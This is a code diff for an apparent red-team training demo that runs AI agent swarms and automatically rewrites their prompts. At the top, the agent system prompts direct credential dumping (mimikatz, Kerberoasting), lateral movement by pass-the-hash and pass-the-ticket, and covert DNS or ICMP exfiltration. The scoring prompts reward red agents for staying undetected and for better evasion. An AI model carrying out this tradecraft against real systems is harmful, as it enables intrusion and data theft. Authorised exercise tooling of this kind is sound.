+Credentials first: dump LSASS via mimikatz/lsassy, extract /etc/shadow and crack offline, target Kerberoastable service accounts, harvest from SAM where local admin. Movement: PtH (Pass-the-Hash) via wmiexec.py, PtT (Pass-the-Ticket) via Rubeus, PsExec for noisy-but-reliable, WMI for quieter execution, RDP only when defenders are confirmed not actively monitoring sessions.
+
+End with: LATERAL MOVE COMPLETE — NEW SEGMENT: [IP/host] — METHOD: [PtH/PtT/PsExec/WMI/RDP] — CREDENTIAL CLASS: [type].`,
+  'OBJECTIVES': `You are OBJECTIVES, the objective-achievement specialist of red-team-ops-v2. You execute the engagement-defined objectives once sufficient access exists, package evidence with chain-of-custody hashes, and exfiltrate over a covert channel.
+
+Objective classes: flag capture (CTF/CCDC), data exfiltration (engagement-scoped target sets only), domain dominance proof (krbtgt extraction or DA-credential proof). Evidence packaging: SHA-256 hash each artifact, record collection timestamp, encrypt at rest, log to OBJECTIVE-LOG.md. Exfil channels: HTTPS POST to authorized OPSEC-blue-server (looks like normal traffic), DNS TXT records for low-bandwidth covert channel, ICMP for environments with strict egress filtering.
+
+End with: OBJECTIVE COMPLETE — FLAG: [value or hash] — EXFIL: [channel] — EVIDENCE PACKAGE: [hash].`,
+};
+
+// Demo content loader
+function gx(id){const e=document.getElementById(id);return e?e.textContent.trim():'';}
+
+// Script-key router — picks de-{role}-{variant} based on mode and import source.
+// IMPORT mode sourced from PHANTOM FEED uses the phantom triplet; everything else routes
+// by mode (custom) or by preset selection.
+function scriptKeyFor(role){
+  if (evolveMode === 'custom') return `de-${role}-custom`;
+  if (evolveMode === 'import' && /PHANTOM/i.test(importData?.exercise_name||'')) return `de-${role}-phantom`;
+  return `de-${role}-${evolvePreset}`;
+}
+
+// ─── System Prompts ───
+const SYS_ARBITER = `You are ARBITER, the Performance Scorer and Root-Cause Analyst. You analyze AI agent exercise transcripts and produce structured scorecards.
+
+Your output MUST follow this exact format:
+
+## ARBITER SCORECARD
+
+### Exercise Summary
+[2 sentences: what happened, what the outcome was]
+
+### Stage Performance Breakdown
+| Stage | Agent | Score | What Worked | What Failed |
+|---|---|---|---|---|
+| [stage name] | [agent name] | [0-10] | [specific behavior] | [specific gap] |
+
+### Aggregate Score: [N]/10
+
+### Weakest Agent: [AGENT-NAME]
+Weakness Class: [detection_gap | evasion_failure | coordination_miss | scope_confusion | output_quality]
+Root Cause: [1-2 sentences: specific failure in agent's instructions — quote a phrase or name a missing capability]
+Refinement Target: [1 sentence: what the agent's prompt should do that it currently doesn't]
+
+### ARBITER JUDGMENT: REFINE [AGENT-NAME]
+
+RULES:
+1. Identify exactly ONE weakest agent. Never name two.
+2. Root cause must reference the agent's actual instructions specifically.
+3. Score each stage independently — aggregate emerges from stage scores.
+4. Weakness class must come exactly from the five-value enum above.
+5. Stage failures must name specific techniques, tool outputs, or protocol failures — not vague assertions.
+6. For red vs. blue exercises: score red agents on achieving objectives undetected, blue agents on detecting and containing threats.`;
+
+const SYS_SCULPTOR = `You are SCULPTOR, the Agent Prompt Refiner. You receive a system prompt and ARBITER's diagnosis and rewrite the prompt to address the identified weakness.
+
+Your output MUST follow this exact format:
+
+## SCULPTOR REFINEMENT REPORT
+
+### Agent: [AGENT-NAME]
+### Weakness Addressed: [weakness class]
+
+### Diagnosis
+[2-3 sentences: what specifically in the original prompt caused the failure]
+
+### Refinement Strategy
+[1-2 sentences: what type of change is being made]
+
+### REFINED SYSTEM PROMPT
+---BEGIN REFINED PROMPT---
+[complete rewritten system prompt — full text, not a diff]
+---END REFINED PROMPT---
+
+### CHANGE MANIFEST
+- ADDED: [what was added and why]
+- TIGHTENED: [what was tightened]
+- CLARIFIED: [what was clarified]
+- REMOVED: [what was removed]
+[maximum 6 items total]
+
+RULES:
+1. You are a prompt engineer, not a domain expert. Make instructions more specific and complete — do not change the agent's role.
+2. Every CHANGE MANIFEST item must be traceable to ARBITER's diagnosis.
+3. Produce the COMPLETE system prompt between the delimiters. Never produce a partial diff.
+4. For detection_gap: add explicit indicators or heuristics. For evasion_failure: add technique variation instructions. For coordination_miss: strengthen handoff language. For scope_confusion: tighten boundary statements. For output_quality: add format examples.
+5. CHANGE MANIFEST is mandatory. Maximum 6 items.`;
+
+const SYS_CHALLENGER = `You are CHALLENGER, the Domain Challenge Designer. You receive a swarm description and agent prompts and design an appropriate challenge that will stress-test the weakest coordination seam.
+
+Your output MUST follow this exact format:
+
+## CHALLENGER DESIGN
+
+### Swarm Domain: [inferred domain]
+### Challenge: [CHALLENGE-NAME — 2-4 words, ALL CAPS]
+
+### Challenge Scenario
+[3-4 sentences: concrete situation]
+
+### Synthetic Exercise Transcript
+**[AGENT-NAME] — [stage description]**
+[3-5 sentences of specific, realistic agent output]
+[Outcome: PASS | PARTIAL | FAIL — one sentence why]
+
+[repeat for 4-6 agent turns total]
+
+### Scoring Rubric
+| Criterion | Weight | What earns full marks |
+|---|---|---|
+| [domain-specific criterion] | [N]/10 | [specific behavior] |
+Total: 10 points
+
+### Likely Weakest Agent: [AGENT-NAME]
+Predicted weakness: [1 sentence]
+
+RULES:
+1. Produce a realistic synthetic exercise transcript — simulate what would happen if the swarm ran this challenge.
+2. Design the challenge to expose the weakest seam in the swarm.
+3. One agent MUST clearly fail or partially fail.
+4. Scoring rubric must derive criteria from the swarm's stated purpose.
+5. The Likely Weakest Agent prediction should reflect honest assessment of the provided prompts.`;
+
+const SYS_RERUN = `You are RERUN, the Post-Refinement Exercise Simulator. You receive a refined agent prompt and the original exercise transcript and produce revised outputs for stages where the weakest agent was active.
+
+Your output MUST follow this exact format:
+
+## RERUN ANALYSIS
+
+### Replaying exercise with refined [AGENT-NAME]...
+
+**[AGENT-NAME] — [stage name]**
+[The stage output the refined agent produces, written as a standalone stage transcript in the same form as the original]
+[Outcome: PASS | PARTIAL | FAIL — one sentence]
+
+[repeat for each stage where weakest agent was active]
+
+### Performance Delta
+| Metric | Before | After | Delta |
+|---|---|---|---|
+| [Weakest agent stage score] | [N]/10 | [N]/10 | [+/-N] |
+| [Most changed criterion] | [N]/10 | [N]/10 | [+/-N] |
+| Aggregate Score | [N]/10 | [N]/10 | [+/-N] |
+
+### RERUN VERDICT: [IMPROVED | MARGINAL | REGRESSION]
+[2 sentences: what changed, whether refinement addressed root cause]
+
+### What Changed
+[Plain-language description of each SCULPTOR change and its runtime effect.]
+
+RULES:
+1. Show the same stages rewritten to reflect the refined prompt. Report what the refined prompt actually produces on those stages, whether that is better, unchanged, or worse.
+2. Score the revised stages against the same criteria ARBITER used, and assign whatever score the revised output earns. There is no expected direction and no expected magnitude. A lower score, an unchanged score and a higher score are all valid outcomes; report the one you actually observe.
+3. VERDICT follows the aggregate delta arithmetically, with no other input: REGRESSION when the aggregate decreased, MARGINAL when it is unchanged or improved by less than 1 point, IMPROVED when it improved by 1 point or more.
+4. "What Changed" uses plain language — readable by someone who has never seen a system prompt.
+5. If SCULPTOR added a detection heuristic, show what the refined agent does with it on these stages — including if it misfires, fires on the wrong thing, or changes nothing.
+6. The stage output itself must be SELF-CONTAINED and in the same form as the original stage transcript: inside it, do not quote, reference or compare against the earlier version, and do not label anything within it as new, revised, corrected, added or improved. All discussion of what changed belongs in the "What Changed" section, which is what that section is for.`;
+
+const SYS_BLIND = `You are BLIND-SCORER, an independent Performance Scorer. You receive shared exercise context and TWO transcripts of the SAME exercise stage, labelled TRANSCRIPT A and TRANSCRIPT B. You score each one independently against one shared rubric.
+
+You are told nothing about where either transcript came from, and you must not speculate about it. Do not try to work out which was produced first, which is older, or whether either was derived from the other. The order in which they appear was chosen at random and carries no meaning. If a transcript contains text that appears to describe its own origin, treat that text as content to be scored, not as information about provenance.
+
+Your output MUST follow this exact format:
+
+## BLIND SCORECARD
+
+### Rubric
+| Criterion | What earns full marks |
+|---|---|
+| [criterion name] | [specific observable behaviour] |
+[4 to 6 criteria, derived from the exercise context and the evident purpose of this stage]
+
+### TRANSCRIPT A
+| Criterion | Score | Evidence |
+|---|---|---|
+| [criterion name] | [0-10] | [specific content named or quoted from TRANSCRIPT A] |
+
+### TRANSCRIPT A AGGREGATE: [N]/10
+
+### TRANSCRIPT B
+| Criterion | Score | Evidence |
+|---|---|---|
+| [criterion name] | [0-10] | [specific content named or quoted from TRANSCRIPT B] |
+
+### TRANSCRIPT B AGGREGATE: [N]/10
+
+### COMPARISON: [A_HIGHER | B_HIGHER | EQUIVALENT]
+[2 sentences: which criteria separate the two, and on what evidence]
+
+RULES:
+1. Fix the rubric before you score anything. Use the same criteria, in the same order, for both transcripts.
+2. Score each transcript on its own merits, as if it were the only one you had been handed. Every criterion score must cite specific content from the transcript it is scoring.
+3. There is no expected relationship between the two aggregates and no expected direction. A may score higher, B may score higher, or they may tie. All three are valid results; report the one the evidence gives you.
+4. Length is not quality and neither is formatting. A longer transcript, a more elaborately structured one, or one with more code blocks is not better for those reasons. Score what the stage output accomplishes against the rubric.
+5. Each transcript's aggregate is the mean of that transcript's criterion scores, to one decimal place.
+6. COMPARISON follows the two aggregates arithmetically and takes no other input: A_HIGHER when A's aggregate exceeds B's, B_HIGHER when B's exceeds A's, EQUIVALENT when they are equal.`;
+
+// ─── Provider / API ───
+function setEvolveProvider(p, init) {
+  evolveProvider = p;
+  if (!init) localStorage.setItem('swarmdemo_provider', p);
+  document.getElementById('eprv-ant').classList.toggle('sel', p === 'anthropic');
+  document.getElementById('eprv-cc').classList.toggle('sel', p === 'cc');
+  document.getElementById('eprv-ollama').classList.toggle('sel', p === 'ollama');
+  const ollamaMdl = document.getElementById('e-ollama-model');
+  const eak = document.getElementById('eak');
+  const ollamaNote = document.getElementById('eollama-note');
+  if (p === 'cc') {
+    if (ollamaMdl) ollamaMdl.style.display = 'none';
+    if (eak) eak.style.display = 'none';
+    document.getElementById('eak-conf').style.display = 'none';
+    if (ollamaNote) ollamaNote.style.display = 'none';
+  } else if (p === 'ollama') {
+    if (ollamaMdl) { ollamaMdl.style.display = 'inline-block'; const saved = localStorage.getItem('swarmdemo_ollama_model'); if (saved) ollamaMdl.value = saved; }
+    if (eak) eak.style.display = 'none';
+    document.getElementById('eak-conf').style.display = 'none';
+    if (ollamaNote) ollamaNote.style.display = '';
+  } else {
+    if (ollamaMdl) ollamaMdl.style.display = 'none';
+    if (ollamaNote) ollamaNote.style.display = 'none';
+    if (eak) eak.placeholder = 'Anthropic API Key (sk-ant-...)';
+    const ak = localStorage.getItem('swarmdemo_loop_key');
+    if (ak) { eak.value = ak; eak.style.display = 'none'; document.getElementById('eak-conf').style.display = 'block'; }
+    else { eak.value = ''; eak.style.display = ''; document.getElementById('eak-conf').style.display = 'none'; }
+  }
+}
+
+function clearEvolveKey() {
+  localStorage.removeItem('swarmdemo_loop_key');
+  const eak = document.getElementById('eak');
+  eak.value = ''; eak.style.display = '';
+  document.getElementById('eak-conf').style.display = 'none';
+}
+
+// ─── Relay failure classification — display half ───
+// The local bridge returns failure_class / failure_reason / failure_confidence
+// beside the unchanged `error` string. Absent fields read as UNKNOWN. Every
+// other provider path throws untagged Errors and MUST keep reading as UNKNOWN:
+// a class we did not observe is not a class we may assert.
+// Third-party output reaches this page as `error` text: the local bridge
+// appends raw CLI stderr to it. That string is rendered on a projector, so it
+// is escaped at EVERY markup sink. Not just `failure_detail` -- the same bytes
+// arrive under a different field name, and a scan of this file can never show
+// them, because the string does not exist until a process fails.
+function escHtml(s){
+  return String(s==null?'':s)
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+// Escaping stops markup injection. It does NOT stop DISCLOSURE, and the
+// disclosure is the point here: a stderr tail reading "ENOENT ... open
+// '/home/<user>/working/<repo-name>/...'" puts the repository name on the
+// projector in readable text. Collapse absolute paths to their last segment
+// before display -- the filename is the diagnostic value, the directories are
+// the leak. Narrowing, not a guarantee: it removes the path class we have
+// actually observed, and an unrecognised shape still reaches the screen.
+function redactPaths(s){
+  return String(s==null?'':s)
+    .replace(/(^|[\s'"(\[])((?:\/[A-Za-z0-9._@+-]+){2,})/g,
+             (m,pre,path)=>pre+'…/'+path.split('/').filter(Boolean).pop())
+    .replace(/(^|[\s'"(\[])([A-Za-z]:(?:\\[^\s'"\\]+){2,})/g,
+             (m,pre,path)=>pre+'…\\'+path.split('\\').filter(Boolean).pop());
+}
+// The one call every markup sink uses for third-party error text.
+function safeErrText(s){ return escHtml(redactPaths(s)); }
+function tagFailure(err,o){
+  err.failureClass=(o&&o.failure_class)||'unknown';
+  err.failureReason=(o&&o.failure_reason)||null;
+  err.failureConfidence=(o&&o.failure_confidence)||'none';
+  return err;
+}
+// Recorded, not yet consumed. A refusal is a SUCCESSFUL call, so this is the
+// positive evidence that a model turn actually happened — which is what lets a
+// later branch call an unusable answer a CONTENT failure instead of guessing
+// from the absence of an error. The branch that reads it needs a signal from
+// the pipeline, not from the bridge, and is out of scope for this patch.
+let lastCallCompleted=false;
+const FAILURE_CLASSES={
+  infrastructure:{tag:'INFRASTRUCTURE FAILURE — the model was never reached.',
+                  headline:'The request did not get through. This is the plumbing, not your brief.',
+                  color:'#d4a72c'},
+  content:{tag:'CONTENT FAILURE — the model was reached, and the request was rejected.',
+           headline:'',color:'#5ac8fa'},
+  unknown:{tag:'UNCLASSIFIED FAILURE — the cause is not known.',
+           headline:'',color:'#ff3355'}
+};
+const FAILURE_REASONS={
+  quota_exhausted:'Access limit exhausted on this account. Nothing was wrong with the brief.',
+  auth_unavailable:'Sign-in is missing or expired on this machine.',
+  network_unreachable:'The network connection failed.',
+  upstream_unavailable:'The service is unavailable or overloaded upstream.',
+  timeout:'No response arrived within the time budget.',
+  cli_missing:'The local tool is missing, or could not be started.',
+  cli_unusable:'The local tool is missing, or could not be started.',
+  spawn_failed:'The local tool is missing, or could not be started.',
+  local_resource_exhausted:'This machine ran out of memory or disk.',
+  process_killed:'The local process was killed before it answered.',
+  bad_request:'The page sent a malformed request.',
+  prompt_too_long:"The brief plus the accumulated context exceeded the model's input limit.",
+  relay_token_missing:'This page did not present the relay access token. The relay printed one when it started.',
+  content_filtered:'The input was rejected by a content filter before any answer was generated.'
+};
+// Returns only fixed table constants. Nothing the bridge sent is in the result:
+// failureReason is a lookup KEY, never rendered text.
+function failureLines(err){
+  const cls=(err&&err.failureClass)||'unknown';
+  const f=FAILURE_CLASSES[cls]||FAILURE_CLASSES.unknown;
+  const reason=(err&&FAILURE_REASONS[err.failureReason])||'';
+  let lines;
+  if(cls==='infrastructure'){lines=[f.headline].concat(reason?[reason]:[]);}
+  else if(cls==='content'){lines=reason?[reason]:[];}
+  else{lines=[
+    'The call failed, and the diagnostic does not match anything this build recognizes.',
+    'This is deliberately NOT being reported as either an infrastructure fault or a content fault.',
+    'Raw message below, unedited.'];}
+  return {tag:f.tag,color:f.color,lines:lines};
+}
+function failureBanner(err){
+  const fx=failureLines(err);
+  return `<div class="phase-recovery-cls" style="color:${fx.color}">${fx.tag}</div>`+
+    fx.lines.map(l=>`<div class="phase-recovery-sub">${l}</div>`).join('');
+}
+// ─── Relay access token ───
+// The relay mints a random token per run and refuses any BROWSER-originated
+// request that does not carry it. This matters more than it looks: the relay
+// binds 127.0.0.1, but the browser is ON 127.0.0.1, so before the token
+// existed every page the attendee had open could POST to localhost:3001 and
+// drive their authenticated CLI. A loopback bind is not authentication.
+//
+// Delivery: the relay prints a demo link carrying the token in the URL
+// FRAGMENT. A fragment is chosen over a query string because a fragment is
+// never sent to a server, and so can never reach a server or proxy log. It is
+// read once, kept, and stripped from the address bar.
+const RELAY_TOKEN_KEY='swarmdemo_relay_token';
+let _relayTokenMem='';
+let _relayTokenAskedFor=null;
+function setRelayToken(t){
+  _relayTokenMem=String(t==null?'':t).trim();
+  // localStorage is unavailable on file:// in some browsers. The in-memory
+  // copy above is what makes the fragment path work there regardless.
+  try{localStorage.setItem(RELAY_TOKEN_KEY,_relayTokenMem);}catch(_){}
+}
+function relayToken(){
+  if(_relayTokenMem)return _relayTokenMem;
+  try{return localStorage.getItem(RELAY_TOKEN_KEY)||'';}catch(_){return '';}
+}
+(function adoptRelayTokenFromHash(){
+  try{
+    const h=location.hash||'';
+    const m=h.match(/[#&]relay_token=([^&]+)/);
+    if(!m)return;
+    setRelayToken(decodeURIComponent(m[1]));
+    const cleaned=h.replace(/[#&]relay_token=[^&]*/,'');
+    try{history.replaceState(null,'',location.pathname+location.search+(cleaned&&cleaned!=='#'?cleaned:''));}catch(_){}
+  }catch(_){}
+})();
+// The token rides in a header, never a query string: a query string is written
+// to server logs, browser history and Referer headers. The header is sent on
+// every relay call even when the token is empty, so a missing token surfaces
+// as one clean 401 from the relay rather than a silent client-side branch.
+function relayHeaders(extra){
+  const h=Object.assign({'Content-Type':'application/json'},extra||{});
+  h['Authorization']='Bearer '+relayToken();
+  return h;
+}
+// Paste-once fallback for an attendee who opened the demo without the link.
+// Asked at most once per distinct token already in hand: a wrong paste can be
+// corrected, but a repeated failure cannot loop.
+function handleRelayAuthFailure(){
+  const cur=relayToken();
+  if(_relayTokenAskedFor===cur)return;
+  _relayTokenAskedFor=cur;
+  let t=null;
+  try{t=window.prompt('The local relay needs its access token.\n\nThe relay printed one when it started:\n  [RELAY] Access token: ...\n\nPaste it here, then press [ Retry phase ].');}catch(_){}
+  if(t&&t.trim())setRelayToken(t.trim());
+}
+async function callClaudeCode(sys, user, onDelta, opts) {
+  // SSE branch when onDelta is supplied (LIVE+CC long-output phases).
+  // opts.timeoutSec (60-1800) bumps relay-side per-call timeout — used by
+  // the recovery banner's "Continue waiting" button.
+  const qs = opts && opts.timeoutSec ? `?timeout=${Math.max(60, Math.min(1800, opts.timeoutSec | 0))}` : '';
+  if (typeof onDelta === 'function') {
+    const r = await fetch('http://localhost:3001/v1/chat' + qs, {
+      method: 'POST',
+      headers: relayHeaders({'Accept': 'text/event-stream'}),
+      body: JSON.stringify({system: sys, user, model: 'claude-sonnet-4-6', max_tokens: 1400})
+    });
+    if (!r.ok) { let m = `HTTP ${r.status}`, p = null; try { p = await r.json(); m = p.error || m; } catch (_) {} if (r.status === 401) handleRelayAuthFailure(); throw tagFailure(new Error(m), p); }
+    if (!r.body) throw new Error('SSE stream missing response body');
+    const reader = r.body.getReader();
+    const dec = new TextDecoder();
+    let buf = '', full = '', err = null, doneSeen = false;
+    while (true) {
+      const { value, done } = await reader.read();
+      if (done) break;
+      buf += dec.decode(value, { stream: true });
+      let idx;
+      while ((idx = buf.indexOf('\n\n')) >= 0) {
+        const frame = buf.slice(0, idx); buf = buf.slice(idx + 2);
+        const line = frame.split('\n').find(l => l.startsWith('data:'));
+        if (!line) continue;
+        let payload;
+        try { payload = JSON.parse(line.slice(5).trim()); } catch (_) { continue; }
+        if (payload.error) { err = tagFailure(new Error(payload.error), payload); }
+        else if (payload.delta) { full += payload.delta; onDelta(payload.delta); }
+        else if (payload.warning) { flashStallWarning(payload.warning); }
+        else if (payload.done) { if (typeof payload.content === 'string') full = payload.content; doneSeen = true; if (payload.completed === true) lastCallCompleted = true; clearStallWarning(); }
+      }
+    }
+    // If the relay sent a final done event, prefer it over any stray late
+    // error frame (post-completion API hiccup after the model finished cleanly).
+    if (!doneSeen) {
+      if (err) throw err;
+      if (!full) throw new Error('SSE stream closed before any content received');
+    }
+    return full;
+  }
+  const r = await fetch('http://localhost:3001/v1/chat' + qs, {
+    method: 'POST', headers: relayHeaders(),
+    body: JSON.stringify({system: sys, user, model: 'claude-sonnet-4-6', max_tokens: 1400})
+  });
+  if (!r.ok) { let m = `HTTP ${r.status}`, p = null; try { p = await r.json(); m = p.error || m; } catch (_) {} if (r.status === 401) handleRelayAuthFailure(); throw tagFailure(new Error(m), p); }
+  const jb = await r.json();
+  if (jb && jb.completed === true) lastCallCompleted = true;
+  return jb.content;
+}
+async function evolveCallAPI(sys, user, ak, opts) {
+  // opts threads the recovery banner's "continue waiting" timeout bump through
+  // to the relay, the same way the streaming phases already do.
+  if (evolveProvider === 'cc') return callClaudeCode(sys, user, undefined, opts);
+  if (evolveProvider === 'ollama') {
+    const model = (document.getElementById('e-ollama-model')?.value.trim()) || localStorage.getItem('swarmdemo_ollama_model') || 'llama3.2';
+    const r = await fetch('http://localhost:11434/v1/chat/completions', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ model, max_tokens: 1400, messages: [{ role: 'system', content: sys }, { role: 'user', content: user }] })
+    });
+    if (!r.ok) { let m = `HTTP ${r.status}`; try { const e = await r.json(); m = e.error?.message || e.message || m; } catch (_) {} throw new Error(m); }
+    return (await r.json()).choices[0].message.content;
+  }
+  const h = { 'Content-Type': 'application/json' };
+  if (ak) { h['x-api-key'] = ak; h['anthropic-version'] = '2023-06-01'; h['anthropic-dangerous-direct-browser-access'] = 'true'; }
+  const r = await fetch('https://api.anthropic.com/v1/messages', {
+    method: 'POST', headers: h,
+    body: JSON.stringify({ model: 'claude-sonnet-4-6', max_tokens: 1400, system: sys, messages: [{ role: 'user', content: user }] })
+  });
+  if (!r.ok) { let m = `HTTP ${r.status}`; try { const e = await r.json(); m = e.error?.message || m; } catch (_) { } throw new Error(m); }
+  return (await r.json()).content[0].text;
+}
+
+// ─── Demo toggle ───
+function toggleDemo() {
+  demoMode = !demoMode;
+  const btn = document.getElementById('demo-btn');
+  btn.classList.toggle('active', demoMode);
+  btn.textContent = demoMode ? '[ ◉ DEMO ON ]' : '[ ◉ DEMO ]';
+  if (demoMode) {
+    document.getElementById('eak').style.display = 'none';
+    document.getElementById('eak-conf').style.display = 'none';
+    document.getElementById('binfo').textContent = 'DEMO MODE — pre-scripted playback, no API key needed.';
+    if (evolveMode === 'custom') populateCustomDemoFields();
+  } else {
+    const saved = localStorage.getItem('swarmdemo_loop_key');
+    if (saved) { document.getElementById('eak').style.display = 'none'; document.getElementById('eak-conf').style.display = 'block'; }
+    else { document.getElementById('eak').style.display = ''; document.getElementById('eak-conf').style.display = 'none'; }
+    document.getElementById('binfo').textContent = 'Select a mode to begin the self-refinement loop.';
+  }
+}
+
+function populateCustomDemoFields() {
+  const brief = document.getElementById('custom-brief');
+  if (brief && !brief.value) brief.value = gx('de-custom-brief');
+  const a1n = document.getElementById('a1-name'); if (a1n && !a1n.value) a1n.value = gx('de-custom-a1-name');
+  const a1p = document.getElementById('a1-prompt'); if (a1p && !a1p.value) a1p.value = gx('de-custom-a1-prompt');
+  const a2n = document.getElementById('a2-name'); if (a2n && !a2n.value) a2n.value = gx('de-custom-a2-name');
+  const a2p = document.getElementById('a2-prompt'); if (a2p && !a2p.value) a2p.value = gx('de-custom-a2-prompt');
+  const a3n = document.getElementById('a3-name'); if (a3n && !a3n.value) a3n.value = gx('de-custom-a3-name');
+  const a3p = document.getElementById('a3-prompt'); if (a3p && !a3p.value) a3p.value = gx('de-custom-a3-prompt');
+}
+
+function toggleStep() {
+  stepMode = !stepMode;
+  const btn = document.getElementById('step-btn');
+  btn.classList.toggle('active', stepMode);
+  btn.textContent = stepMode ? '[ ⏸ STEP ON ]' : '[ ⏸ STEP ]';
+}
+
+let stepResolve = null;
+function advanceStep() {
+  document.getElementById('evolve-step-gate')?.remove();
+  if (stepResolve) { stepResolve(); stepResolve = null; }
+}
+
+async function waitStep(label) {
+  if (!stepMode) return;
+  return new Promise(resolve => {
+    stepResolve = resolve;
+    const panel = document.querySelector('.phase-panel.active');
+    if (!panel) { resolve(); return; }
+    const d = document.createElement('div');
+    d.className = 'step-gate'; d.id = 'evolve-step-gate';
+    d.innerHTML = `<button class="step-btn" onclick="advanceStep()">[ ▶ CONTINUE — ${label} ]</button>`;
+    panel.appendChild(d);
+    panel.scrollTop = 1e9;
+  });
+}
+
+// ─── Phase management ───
+let currentPhase = -1;
+function setPhase(n) {
+  currentPhase = n;
+  document.querySelectorAll('.eph').forEach((el, i) => {
+    el.className = 'eph' + (i < n ? ' done' : i === n ? ' active' : '');
+  });
+  document.querySelectorAll('.phase-panel').forEach((el, i) => {
+    el.classList.toggle('active', i === n);
+  });
+}
+
+// ─── LocalStorage ───
+function loadEvolveSource() {
+  try {
+    const raw = localStorage.getItem('swarmdemo_loop_source');
+    if (!raw) return null;
+    const d = JSON.parse(raw);
+    if (d.version !== 1 || !d.domain || !Array.isArray(d.stage_results)) return null;
+    return d;
+  } catch (_) { return null; }
+}
+
+function exportToCombat() {
+  if(!refinedPrompt||!weakestAgentName)return;
+  const data = {
+    version: 1,
+    timestamp: new Date().toISOString(),
+    refined_agent: {
+      name: weakestAgentName,
+      refined_prompt: refinedPrompt,
+      change_manifest: changeManifest,
+      arbiter_score_before: scoreBefore,
+      rerun_score_after: scoreAfter,
+      weakness_class: parseArbiterOutput(arbiterOutput).weaknessClass || 'detection_gap'
+    },
+    iteration: cycleNum,
+    source_exercise: 'OPERATION IRONCLAD'
+  };
+  localStorage.setItem('swarmdemo_loop_export', JSON.stringify(data));
+  const btn = document.getElementById('export-combat-btn');
+  btn.textContent = '[ EXPORTED ✓ ]';
+  btn.classList.add('done');
+  const link=document.querySelector('.combat-link'); if(link){link.style.borderColor='var(--grn)';link.style.color='var(--grn)';link.style.boxShadow='0 0 10px rgba(0,240,144,.35)';link.title='Export saved — open combat demo to test the refined agent';}
+}
+
+function copyRefinedPrompt() {
+  if (refinedPrompt) {
+    navigator.clipboard.writeText(refinedPrompt).then(() => {
+      const btn = document.querySelector('.export-copy-btn');
+      const orig = btn.textContent;
+      btn.textContent = '[ COPIED ✓ ]';
+      setTimeout(() => { btn.textContent = orig; }, 2000);
+    });
+  }
+}
+
+function dlEvolveTranscript() {
+  if (!refinedPrompt || !weakestAgentName) return;
+  const ts = new Date().toISOString();
+  // Use runMode/runPreset (snapshotted at run start) so
+  // metadata + filename reflect the actual run, not post-run UI state.
+  const lblMode = runMode || evolveMode;
+  const lblPreset = runPreset || evolvePreset;
+  const modeLabel = lblMode === 'preset' ? `PRESET ${lblPreset.toUpperCase()}`
+                  : lblMode === 'import' ? `IMPORTED (${importData?.exercise_name || 'unknown source'})`
+                  : lblMode === 'custom' ? 'CUSTOM' : (lblMode || 'unknown').toUpperCase();
+  const manifestLines = (changeManifest && changeManifest.length)
+    ? changeManifest.map((c, i) => `${i + 1}. ${typeof c === 'string' ? c : JSON.stringify(c)}`).join('\n')
+    : '(no change manifest captured)';
+  const fnBase = lblMode === 'preset' ? `loop-preset-${lblPreset}`
+              : lblMode === 'import' ? `loop-import-${(importData?.exercise_name || 'src').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')}`
+              : `loop-${lblMode || 'run'}`;
+  const pkg = [
+    `<!-- IMPROVEMENT LOOP — CYCLE TRANSCRIPT v3.0`,
+    `  Generated: ${ts}`,
+    `  Mode: ${modeLabel}`,
+    `  Weakest Agent: ${weakestAgentName} (cycle ${cycleNum})`,
+    `  Score: ${fmtScore(scoreBefore)} → ${fmtScore(scoreAfter)} (delta ${fmtDelta(scoreBefore, scoreAfter)})`,
+    `  Run Mode: ${demoMode ? 'DEMO' : 'LIVE'} | Provider: ${evolveProvider || 'anthropic'}`,
+    `-->`, ``,
+    `# LOOP CYCLE TRANSCRIPT — ${modeLabel}`, ``,
+    `**Generated:** ${ts}  `,
+    `**Mode:** ${demoMode ? 'DEMO' : 'LIVE'}  `,
+    `**Weakest Agent:** ${weakestAgentName}  `,
+    `**Cycle:** ${cycleNum}  `,
+    `**Self-graded score before → after (NOT the measurement):** ${fmtScore(scoreBefore)} → ${fmtScore(scoreAfter)} (delta ${fmtDelta(scoreBefore, scoreAfter)})  `,
+    `**BLIND PAIRED DELTA — the measurement:** ${(blindResult && !blindResult.notRun) ? fmtDelta(blindResult.originalScore, blindResult.revisedScore) : 'UNPARSED'}  `,
+    ``, `---`, ``,
+    `## BLIND PAIRED SCORE — THE MEASUREMENT`, ``,
+    (!blindResult
+      ? 'Not run in recorded mode — this measurement requires a live scoring call. No number has been substituted.'
+      : blindResult.notRun
+        ? `NOT RUN — ${blindResult.notRun}. No number has been substituted.`
+        : [`- Randomized assignment: post-rewrite stage output was presented as TRANSCRIPT ${blindResult.revisedLetter}; the original was presented as TRANSCRIPT ${blindResult.originalLetter}.`,
+           `- TRANSCRIPT A aggregate: ${fmtScore(blindResult.scoreA)}`,
+           `- TRANSCRIPT B aggregate: ${fmtScore(blindResult.scoreB)}`,
+           `- Un-blinded: original ${fmtScore(blindResult.originalScore)} → post-rewrite ${fmtScore(blindResult.revisedScore)} (paired delta ${fmtDelta(blindResult.originalScore, blindResult.revisedScore)})`,
+           `- Blind comparison verdict: ${blindResult.comparison || 'UNPARSED'}${blindResult.unblinded ? ' → ' + blindResult.unblinded : ''}`,
+           (blindResult.leaks && blindResult.leaks.length ? `- BLINDING LEAK — wording that could identify a side survived the scrub: ${blindResult.leaks.join(', ')}. This run's blind is not clean.` : '- Blinding leak check: clean.'),
+           ``, `### BLIND SCORER OUTPUT`, ``, (blindResult.output || '(none)').trim()].join('\n')),
+    ``, `---`, ``,
+    `## EXERCISE TRANSCRIPT (input to ARBITER)`, ``, (exerciseTranscript || '(no transcript captured)').trim(), ``, `---`, ``,
+    `## ARBITER — PERFORMANCE SCORECARD`, ``, (arbiterOutput || '(no arbiter output)').trim(), ``, `---`, ``,
+    `## SCULPTOR — CHANGE ANALYSIS`, ``, (sculptorOutput || '(no sculptor output)').trim(), ``, `---`, ``,
+    `## ORIGINAL PROMPT (${weakestAgentName} — pre-refinement)`, ``, '```', (weakestAgentOriginalPrompt || '(no original prompt captured)').trim(), '```', ``, `---`, ``,
+    `## REFINED PROMPT (${weakestAgentName} — post-refinement)`, ``, '```', refinedPrompt.trim(), '```', ``, `---`, ``,
+    `## CHANGE MANIFEST`, ``, manifestLines, ``, `---`, ``,
